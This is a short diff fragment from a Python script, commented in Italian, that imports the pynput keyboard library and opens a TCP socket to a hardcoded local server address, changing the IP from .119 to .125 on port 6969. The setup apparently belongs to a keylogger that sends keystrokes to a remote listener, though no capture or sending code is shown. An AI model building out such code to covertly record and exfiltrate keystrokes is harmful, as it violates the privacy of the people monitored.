@@ -5,7 +5,7 @@ from pynput import keyboard
 
 # 0.0.0.0 indirizzo ip speciale, anche detto This Host
 # ADDRESS = ("0.0.0.0", 5000)
-SERVER_ADDRESS = ("192.168.1.119",6969)
+SERVER_ADDRESS = ("192.168.1.125",6969)
 BUFFER = 4096
                                 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
